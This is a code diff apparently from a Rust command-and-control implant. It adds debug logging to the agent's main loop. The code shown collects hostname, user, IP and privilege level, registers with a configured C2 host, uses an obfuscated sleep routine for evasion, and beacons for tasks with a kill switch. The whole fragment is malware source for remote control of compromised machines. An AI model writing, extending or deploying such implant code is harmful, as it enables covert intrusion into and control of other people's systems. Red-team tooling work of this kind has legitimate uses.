@@ -19,8 +19,11 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
     let ip        = local_ip();
     let priv_lvl  = current_privilege();
 
+    crate::dbg_log!("agent_id={agent_id} hostname={hostname} user={username} ip={ip} priv={priv_lvl}");
+
     // Build transport
     let tls = cfg.protocol == "https";
+    crate::dbg_log!("building transport proto={} host={} port={}", cfg.protocol, cfg.c2_host, cfg.c2_port);
     let mut transport = match cfg.protocol.as_str() {
         "tcp" => Transport::Tcp(TcpTransport::new(&cfg.c2_host, cfg.c2_port, agent_id)),
         _     => Transport::Http(HttpTransport::new(&cfg.c2_host, cfg.c2_port, tls, agent_id)),
@@ -47,9 +50,14 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
     // Retry registration with exponential backoff
     let mut backoff = 1u64;
     loop {
+        crate::dbg_log!("attempting registration (backoff={backoff}s)...");
         match transport.register(&reg).await {
-            Ok(_)  => { break; }
-            Err(_) => {
+            Ok(_)  => {
+                crate::dbg_log!("registration successful");
+                break;
+            }
+            Err(e) => {
+                crate::dbg_log!("registration failed: {e} — retrying in {backoff}s");
                 evasion::obfuscated_sleep(backoff * 1000, &cfg.sleep_obf).await;
                 backoff = (backoff * 2).min(300);
             }
@@ -88,9 +96,10 @@ pub async fn run(cfg: AgentConfig) -> Result<()> {
             results: std::mem::take(&mut pending_results),
         };
 
+        crate::dbg_log!("beaconing ({} pending results)...", beacon.results.len());
         let resp = match transport.beacon(&beacon).await {
-            Ok(r)  => r,
-            Err(_) => continue,
+            Ok(r)  => { crate::dbg_log!("beacon ok — {} tasks", r.tasks.len()); r }
+            Err(e) => { crate::dbg_log!("beacon error: {e}"); continue; }
         };
 
         if resp.kill { return Ok(()); }
